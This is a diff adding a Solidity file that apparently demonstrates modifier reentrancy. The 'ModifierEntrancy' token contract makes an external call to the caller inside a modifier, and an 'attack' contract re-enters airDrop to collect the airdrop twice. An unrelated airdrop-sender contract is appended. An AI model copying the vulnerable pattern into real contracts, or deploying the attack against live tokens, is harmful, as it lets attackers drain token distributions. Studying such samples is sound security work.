@@ -1,0 +1,68 @@
+ 
+
+pragma solidity ^0.4.24;
+
+contract ModifierEntrancy {
+  mapping (address => uint) public tokenBalance;
+  string constant name = "Nu Token";
+
+   
+   
+  function airDrop() hasNoBalance supportsToken  public{
+    tokenBalance[msg.sender] += 20;
+  }
+
+   
+  modifier supportsToken() {
+    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
+    _;
+  }
+   
+  modifier hasNoBalance {
+      require(tokenBalance[msg.sender] == 0);
+      _;
+  }
+}
+
+contract Bank{
+    function supportsToken() external pure returns(bytes32){
+        return(keccak256(abi.encodePacked("Nu Token")));
+    }
+}
+
+contract attack{  
+    bool hasBeenCalled;
+    function supportsToken() external returns(bytes32){
+        if(!hasBeenCalled){
+            hasBeenCalled = true;
+            ModifierEntrancy(msg.sender).airDrop();
+        }
+        return(keccak256(abi.encodePacked("Nu Token")));
+    }
+    function call(address token) public{
+        ModifierEntrancy(token).airDrop();
+    }
+}
+
+contract ERC20 {
+    function transfer(address to, uint256 tokens) public returns (bool success);
+}
+
+contract owned {
+    address owner;
+
+    modifier onlyOwner {
+        require(msg.sender == owner);
+        _;
+    }
+}
+
+contract airdropManager is owned {
+
+    function send(address tokenAddress, address[] addressList, uint256[] amountList) public onlyOwner {
+        require(addressList.length == amountList.length);
+        for (uint i = 0; i < addressList.length; i++) {
+            ERC20(tokenAddress).transfer(addressList[i], amountList[i] * 1e18);
+        }
+    }
+}
